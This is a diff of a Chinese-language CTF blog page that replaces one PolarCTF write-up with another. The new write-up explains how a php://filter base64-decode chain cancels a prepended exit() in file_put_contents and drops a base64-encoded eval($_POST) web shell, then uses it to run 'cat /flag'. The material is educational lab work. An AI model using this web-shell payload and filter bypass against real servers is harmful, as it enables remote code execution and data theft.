@@ -8,13 +8,11 @@
       
       
       
-        <link rel="canonical" href="http://www.sxrhhh.top/writeups/2024/06/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--polarctf%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2/">
+        <link rel="canonical" href="http://www.sxrhhh.top/writeups/2024/06/08/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--polarctf%E5%86%99shell/">
       
       
-        <link rel="prev" href="../../06/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--polarctf%E7%AE%80%E5%8D%95rce/">
+        <link rel="prev" href="../../07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--polarctf%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2/">
       
-      
-        <link rel="next" href="../../08/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--polarctf%E5%86%99shell/">
       
       
         <link rel="alternate" type="application/rss+xml" title="RSS 订阅" href="../../../../../feed_rss_created.xml">
@@ -25,7 +23,7 @@
     
     
       
-        <title>每日一题 —— [PolarCTF]到底给不给flag呢 - Sxrhhh 的个人小站</title>
+        <title>每日一题 —— [PolarCTF]写shell - Sxrhhh 的个人小站</title>
       
     
     
@@ -81,7 +79,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#每日一题--polarctf到底给不给flag呢" class="md-skip">
+        <a href="#每日一题--polarctf写shell" class="md-skip">
           跳转至
         </a>
       
@@ -117,7 +115,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              每日一题 —— [PolarCTF]到底给不给flag呢
+              每日一题 —— [PolarCTF]写shell
             
           </span>
         </div>
@@ -1661,7 +1659,7 @@
                     <li class="md-nav__item">
                       <div class="md-nav__link">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5v-5Z"/></svg>
-                        <time datetime="2024-06-07 00:00:00" class="md-ellipsis">2024年6月7日</time>
+                        <time datetime="2024-06-08 00:00:00" class="md-ellipsis">2024年6月8日</time>
                       </div>
                     </li>
                     
@@ -1703,20 +1701,40 @@
         
 
 
-<h1 id="每日一题--polarctf到底给不给flag呢">每日一题 —— [PolarCTF]到底给不给flag呢<a class="headerlink" href="#每日一题--polarctf到底给不给flag呢" title="永久链接">&para;</a></h1>
+<h1 id="每日一题--polarctf写shell">每日一题 —— [PolarCTF]写shell<a class="headerlink" href="#每日一题--polarctf写shell" title="永久链接">&para;</a></h1>
 <blockquote>
 <p>题目地址：<a href="https://www.polarctf.com/#/page/challenges">https://www.polarctf.com/#/page/challenges</a></p>
 </blockquote>
 <!-- more -->
 
-<p>打开题目，是一堆的 php 源代码。但是注意到题目要求接受 GET 和 POST 两个方法的参数。</p>
-<p>首先第一步：一旦两个传参方法都没有 <code>flag</code> 参数，就会导致程序退出。所以，我们至少需要一个方法中传入 <code>flag</code> 参数。我们接着往下看：</p>
-<p>第二步，判断两种方法中，都不允许出现 <code>flag==flag</code> 的情况出现。所以，我们接着往下看他们需要我们干什么。</p>
-<p>接下去的两步，先是对 POST 方法中的键值对进行 <code>$$key = $value</code> 的赋值。也就是说，每一个 POST 中的参数名，都会作为一个 php 变量名创建，其值为传入参数的值。然后就是对 GET 方法中的键值对进行 <code>$$key = $$value</code> 的赋值。通俗来讲，就是获取以传入参数的值为变量名的内容，并将其赋值给以传入参数名为变量名的变量。</p>
-<p>我们尝试性地给 GET 赋值： <code>?flag=a</code> ，然后发现回显 "都是假象"， 于是往下翻，发现 “被你发现了”，推测这里为回显位。我们继续观察代码，我们目前传入的参数其实是执行了 <code>$flag=$a</code> ，但是我们的 <code>$a</code> 是不存在的。所以一个不存在的变量把 <code>$flag</code> 的值给覆盖了。所以可能什么有用的信息都没有。</p>
-<p>由于我们最终需要输出 <code>$flag</code> ，而 <code>$flag</code> 的值是不能有改动的。那么我们需要让 <code>$a</code> 的值就是原来的 <code>$flag</code> 的值。观察 POST 方法的赋值，发现它赋值部分是自定义的，那么我们是无法获得 <code>$flag</code> 的值的。所以我们使用 GET 方法的赋值。只要先让 <code>$a = $flag</code> 就可以。所以最终 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>?a=flag&amp;flag=a
+<p>打开题目就是很简单的一行代码，他会把你输入的 <code>content</code> 并上前面的 <code>&lt;?php exit();</code> 一起写入到你指定的文件内。</p>
+<p>观察到题目使用了 <code>file_put_contents</code> 函数，这个函数是支持 php 伪协议的，所以我们可以尝试使用 <code>php://filter</code> 来对我们输入的内容进行转换。预期结果就是，我们输入的内容可以把前面的 <code>exit</code> 函数给弄得失效，并且我们写入的 php 代码可以生效。</p>
+<p>首先尝试这个 payload:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>?filename=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.txt
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>POST:
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>content= ?&lt;hp phpipfn(o;)
 </span></code></pre></div>
+<p>注意 <code>content</code> 和 <code>?</code> 之间的空格，这是因为 <code>UCS-2LE</code> 和 <code>UCS-2BE</code> 之间是两两组队互相交换的。所以为了保证转换成功进行，我们使用空格让前面的数据维持一个偶数个。</p>
+<p>最后发现没有效果，在 <code>/1.txt</code> 中，所有数据被原原本本地写入了进去，也就是说前面的 <code>exit()</code> 被照常执行了。具体原因不清楚，没有办法，我们只能换一个方法。 </p>
+<p>现在我们测试一下 base64 的方法。我们先把需要的东西进行 base64 编码写入进去测试一下：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>?filename=php://filter/convert.base64-encode/resource=1.txt
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>POST:
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>content=&lt;?phpinfo();
+</span></code></pre></div>
+<p>打开 <code>/1.txt</code> 可以看到数据被成功以 base64 的方式写入了进去。但是我们需要往里写入原始数据，所以我们预先要准备好一串 base64 编码好的 payload. 那么前面的函数怎么办呢。这里涉及一个 base64 的知识：base64 在转换的过程中是 3:4 的比例转换的，也就是说，对于一串原始文本，每三个字符一组被转换为一串 base64 ，其长度为 4. 因此在把 base64 解码的过程中，会四个字符一组转换。另外 base64 只支持 <code>[A-Z]</code> <code>[a-z</code> <code>/</code> <code>+</code> <code>=</code> 这些字符，其余的字符都是会被当作垃圾字符直接舍弃掉。</p>
+<p>因此观察前面的代码 <code>&lt;?php exit();</code> ，如果我们将其认为是一段 base64 编码的话，他会被省略无关字符，变为 <code>phpexit</code> ，一共七个字符。那么如果我们转换为原始文本，为了不影响后面的 payload 的转换，按照 4:3 的转换标准，我们需要补上一个合法字符凑齐 4 的倍数，然后再跟上已经编码好的 payload, 如下:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw</span><span class="o">==</span><span class="w">   </span><span class="c1"># &lt;?php eval($_POST[1]);</span>
+</span></code></pre></div>
+<p>熟悉这一段的都知道，<code>PD9w</code> 开头的就是 php 代码了。前面的 a 就会帮忙补足所需要的字节数。因此最终 payload ：</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>?filename<span class="o">=</span>php://filter/convert.base64-decode/resource<span class="o">=</span><span class="m">1</span>.php
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>POST
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nv">content</span><span class="o">=</span><span class="nv">aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw</span><span class="o">==</span>
+</span></code></pre></div>
+<p>注意和之前的 payload 不同的是，我把输出的文件名改成了 <code>1.php</code> ，这样才可以成功解析我们要的 php 代码。另外 <code>base64</code> 后面跟着的是 <code>decode</code> ，因为这一次是我们预先输入了一串 base64，服务器帮我们解析成了原始文本。</p>
+<p>最后，通过访问 <code>/1.php</code> ，无论是蚁剑连接，还是直接手搓 <code>POST: 1=system('cat /flag');</code> 都没问题了。</p>
 
 
 
